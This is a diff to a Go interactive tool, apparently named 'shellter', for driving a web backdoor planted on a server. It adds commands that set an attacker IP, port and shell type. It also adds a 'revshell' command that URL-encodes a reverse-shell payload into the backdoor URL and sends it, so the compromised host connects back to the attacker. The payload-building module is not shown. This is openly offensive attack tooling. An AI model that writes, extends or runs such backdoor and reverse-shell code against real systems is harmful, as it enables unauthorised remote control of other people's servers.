@@ -17,6 +17,9 @@ var (
 	Cmd      string
 	InParams string
 	Type     string
+	Ip       string
+	Port     string
+	RevType  string
 )
 
 /* terminal mode*/
@@ -97,6 +100,42 @@ func executor(in string) {
 		fmt.Println("[+] Params : ", InParams)
 		return
 
+	case "ip":
+		if len(blocks) < 2 {
+			fmt.Println("please set query, Example : ip x.x.x.x")
+			return
+		}
+		Ip = blocks[1]
+		fmt.Println("[+] Set IP : ", Ip)
+		return
+
+	case "port":
+		if len(blocks) < 2 {
+			fmt.Println("please set query, Example : port x.x.x.x")
+			return
+		}
+		Port = blocks[1]
+		fmt.Println("[+] Set Port : ", Port)
+		return
+	case "revshell":
+
+		/*If payload send in body format parses the command*/
+		// interactCommand := strings.Split(in, "command")
+		malpaylaoad := payload.RevShell(Ip, Port, RevType)
+		if InParams == "yes" {
+			url := Url + url.QueryEscape(malpaylaoad)
+			fmt.Println(url)
+			request.DoRequest(url)
+			return
+		}
+		// request.DoPostRequestPayloadInBody(Url, malpaylaoad)
+		return
+
+	case "revtype":
+		RevType = blocks[1]
+		fmt.Println("[+] Set rev type : ", RevType)
+		return
+
 	case "exit":
 		os.Exit(1)
 		return
@@ -117,11 +156,15 @@ func completer(in prompt.Document) []prompt.Suggest {
 	s := []prompt.Suggest{
 		{Text: "url", Description: "Url for your backdoor "},
 		{Text: "command", Description: "Malicious Payload "},
+		{Text: "revshell", Description: "reverse shell  Payload "},
 		{Text: "params", Description: "Payload position "},
 		{Text: "connect", Description: "check backdoor file "},
 		{Text: "type", Description: "type payload deliver example : type php"},
 		{Text: "exit", Description: "exit shellter"},
 		{Text: "show", Description: "Show variables status"},
+		{Text: "ip", Description: "set ip address for reverse shell"},
+		{Text: "port", Description: "set port for reverse shell"},
+		{Text: "revtype", Description: "set port for rev type	"},
 	}
 	return prompt.FilterHasPrefix(s, in.GetWordBeforeCursor(), true)
 }
